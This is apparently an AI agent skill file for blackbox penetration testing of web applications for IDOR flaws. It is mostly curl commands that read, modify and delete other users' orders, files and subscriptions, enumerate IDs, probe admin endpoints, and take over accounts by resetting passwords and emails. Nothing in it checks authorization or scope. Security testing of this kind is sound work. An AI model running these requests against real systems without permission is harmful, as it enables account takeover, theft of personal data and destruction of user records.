---
name: blackbox-idor
description: >-
  Actively test a target web application for Insecure Direct Object Reference
  (IDOR) vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  identifies endpoints with object identifiers (numeric IDs, UUIDs, slugs),
  attempts to access resources belonging to other users by manipulating those
  identifiers, and confirms horizontal and vertical privilege escalation. Writes
  confirmed findings with PoC curl commands to pentest/idor-results.md. Use
  when asked to find IDOR or access control bugs in a blackbox pentest.
---

# Blackbox IDOR Detection

You are actively testing a web application for Insecure Direct Object Reference vulnerabilities without source code access. You will manipulate identifiers in requests to access or modify resources belonging to other users.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## What You Are Looking For

IDOR occurs when you can access another user's resource by changing an identifier in a request. You don't need to break authentication — you just swap IDs.

**Types**:
- **Horizontal IDOR**: User A accesses/modifies User B's data (same privilege level)
- **Vertical IDOR**: Regular user accesses admin-only resources by manipulating IDs

---

## Phase 1: Identify ID Parameters

Read `pentest/target-map.md` and collect all parameters that reference objects:

1. **URL path parameters**: `/api/users/123`, `/api/orders/456`, `/documents/789`
2. **Query string IDs**: `?user_id=1`, `?order_id=42`, `?doc=99`
3. **Request body IDs**: `{"account_id": 5}`, `{"resource_id": "abc-uuid"}`
4. **Hidden form fields**: `<input type="hidden" name="user_id" value="1">`

**ID formats to look for**:
- **Sequential integers**: `1`, `2`, `3` — easiest to enumerate
- **UUIDs**: `550e8400-e29b-41d4-a716-446655440000` — harder but possible if disclosure happens elsewhere
- **Hashed/encoded IDs**: base64, MD5 prefixes — test if deterministic
- **Slugs**: `/users/john-doe` — can enumerate from public pages

Write candidates to `pentest/idor-recon.md`.

---

## Phase 2: Test Setup — Get Two User Accounts

IDOR testing requires two distinct authenticated sessions to prove cross-user access.

If test credentials were provided, use them. Otherwise, attempt to register two accounts:

```bash
# Register User A
curl -sk -X POST "<TARGET_URL>/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser_a","email":"testa@test.com","password":"TestPass123!"}'

# Get User A token
TOKEN_A=$(curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser_a","password":"TestPass123!"}' | \
  grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# Register User B
curl -sk -X POST "<TARGET_URL>/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser_b","email":"testb@test.com","password":"TestPass123!"}'

# Get User B token
TOKEN_B=$(curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser_b","password":"TestPass123!"}' | \
  grep -o '"token":"[^"]*"' | cut -d'"' -f4)
```

---

## Phase 3: Active IDOR Testing

### Test 1: Cross-User Object Access (Horizontal IDOR)

**Step 1**: Create or identify a resource owned by User A
```bash
# Create a resource as User A
curl -sk -X POST "<TARGET_URL>/api/orders" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":1}'
# Note the returned resource ID (e.g. order_id: 42)
```

**Step 2**: Access that resource as User B (should fail with 403/404)
```bash
# Try to access User A's resource as User B
curl -sk "<TARGET_URL>/api/orders/42" \
  -H "Authorization: Bearer $TOKEN_B"
```

**Confirmed IDOR** if:
- Response returns 200 with User A's data (IDOR — full read access)
- Response returns 403 (properly protected — NOT vulnerable)
- Response returns 404 as if the resource doesn't exist (object-level enforcement — NOT vulnerable)

**Step 3**: Try to modify User A's resource as User B
```bash
curl -sk -X PUT "<TARGET_URL>/api/orders/42" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"status":"cancelled"}'
```

**Step 4**: Try to delete User A's resource as User B
```bash
curl -sk -X DELETE "<TARGET_URL>/api/orders/42" \
  -H "Authorization: Bearer $TOKEN_B"
```

### Test 2: Sequential ID Enumeration

If IDs are sequential integers, enumerate neighbors:

```bash
# As User B, try accessing IDs around your own
YOUR_ID=100  # Replace with User B's actual resource ID

for ID in $(seq $((YOUR_ID - 5)) $((YOUR_ID + 5))); do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "<TARGET_URL>/api/documents/$ID" \
    -H "Authorization: Bearer $TOKEN_B")
  echo "ID $ID: HTTP $STATUS"
done
```

If multiple IDs return 200, compare content length — each should return User B's own data only.

### Test 3: Parameter Pollution IDOR

Try injecting a secondary ID parameter that might be processed instead of the primary:

```bash
# Primary path ID + secondary query param
curl -sk "<TARGET_URL>/api/users/100?user_id=1" \
  -H "Authorization: Bearer $TOKEN_B"

# Double body parameters
curl -sk -X PUT "<TARGET_URL>/api/profile" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"user_id":1,"name":"Attacker"}'
```

### Test 4: Admin Resource Access (Vertical IDOR)

From `target-map.md`, identify admin-specific resource IDs or endpoints:

```bash
# Try accessing admin resources as regular user
curl -sk "<TARGET_URL>/api/admin/users/1" \
  -H "Authorization: Bearer $TOKEN_B"

curl -sk "<TARGET_URL>/api/admin/settings" \
  -H "Authorization: Bearer $TOKEN_B"

# Try accessing user management endpoints
curl -sk "<TARGET_URL>/api/users" \
  -H "Authorization: Bearer $TOKEN_B"
```

### Test 5: IDOR in File Download

```bash
# Get your own file ID
curl -sk "<TARGET_URL>/api/files" \
  -H "Authorization: Bearer $TOKEN_A"
# Note file_id: 55

# Access file as User B (who doesn't own it)
curl -sk "<TARGET_URL>/api/files/55/download" \
  -H "Authorization: Bearer $TOKEN_B" -D -
```

### Test 6: IDOR via Indirect Reference (Encoded IDs)

If IDs appear to be base64 encoded:
```bash
# Decode the ID
echo -n "dXNlcl8xMjM=" | base64 -d  # → user_123

# Modify it and re-encode
echo -n "user_1" | base64  # → dXNlcl8x

# Use the modified encoded ID
curl -sk "<TARGET_URL>/api/profile/dXNlcl8x" \
  -H "Authorization: Bearer $TOKEN_B"
```

---

## Phase 4: IDOR in Specific High-Value Features

### Account Takeover via IDOR
```bash
# Change another user's password
curl -sk -X PUT "<TARGET_URL>/api/users/1/password" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"new_password":"hacked123"}'

# Change another user's email
curl -sk -X PUT "<TARGET_URL>/api/users/1/email" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'
```

### Payment/Order IDOR
```bash
# Access another user's invoice
curl -sk "<TARGET_URL>/api/invoices/1001" \
  -H "Authorization: Bearer $TOKEN_B"

# Cancel another user's subscription
curl -sk -X DELETE "<TARGET_URL>/api/subscriptions/200" \
  -H "Authorization: Bearer $TOKEN_B"
```

---

## Output Format

Write findings to `pentest/idor-results.md`:

```markdown
# IDOR Assessment Results

## Executive Summary
- Endpoints tested: [N]
- Confirmed IDOR (Read): [N]
- Confirmed IDOR (Write/Delete): [N]
- Vertical Privilege Escalation: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED IDOR - READ] GET /api/orders/{id}

- **Endpoint**: `GET /api/orders/{id}`
- **Parameter**: `id` (URL path)
- **Attack Type**: Horizontal privilege escalation — User B reads User A's order
- **Impact**: Read any user's order details (items, shipping address, payment method last 4 digits)
- **Evidence**: HTTP 200 returned with User A's order data when User B requests User A's order ID
- **PoC**:
  ```bash
  # Authenticate as User A, create an order, note order ID
  curl -sk -X POST "https://target.com/api/orders" \
    -H "Authorization: Bearer TOKEN_A" \
    -H "Content-Type: application/json" \
    -d '{"item_id":1,"quantity":1}'
  # → {"id": 42, "user_id": 100, "item": "Widget", "address": "123 Main St"}

  # As User B (different account), access User A's order
  curl -sk "https://target.com/api/orders/42" \
    -H "Authorization: Bearer TOKEN_B"
  # → HTTP 200: {"id": 42, "user_id": 100, "item": "Widget", "address": "123 Main St"}
  # CONFIRMED: User B can read User A's order
  ```
- **Remediation**: Scope all database queries by authenticated user ID. Use `WHERE id = ? AND user_id = current_user_id`. Never fetch objects by ID alone without ownership verification.

### [CONFIRMED IDOR - WRITE] PUT /api/profile

- **Endpoint**: `PUT /api/profile`
- **Parameter**: `user_id` (request body)
- **Attack Type**: Mass assignment — attacker submits another user's ID to update their profile
- **Impact**: Account takeover — attacker can change any user's name, email, or other profile fields
- **PoC**:
  ```bash
  curl -sk -X PUT "https://target.com/api/profile" \
    -H "Authorization: Bearer TOKEN_B" \
    -H "Content-Type: application/json" \
    -d '{"user_id":1,"name":"Hacked","email":"evil@attacker.com"}'
  # → HTTP 200: {"user_id":1,"name":"Hacked","email":"evil@attacker.com"}
  # CONFIRMED: User B modified User A (id=1) profile
  ```
- **Remediation**: Ignore and override any user_id in the request body. Always use the authenticated user's ID from the server-side session/token.
```

After writing results, delete `pentest/idor-recon.md`.

---

## Important Reminders

- Always test READ, WRITE, and DELETE operations separately — each may have different access controls.
- Confirm with a second user account whenever possible to avoid false positives.
- If you only have one test account, compare IDs that clearly don't belong to you (lower IDs if you're obviously a new account).
- UUID-based IDs reduce IDOR exploitability but do NOT prevent it if the IDs are disclosed in other responses.
- Missing access control on a single HTTP method (e.g. DELETE but not GET) is still a full IDOR finding.
- Clean up: delete `pentest/idor-recon.md` after writing results.
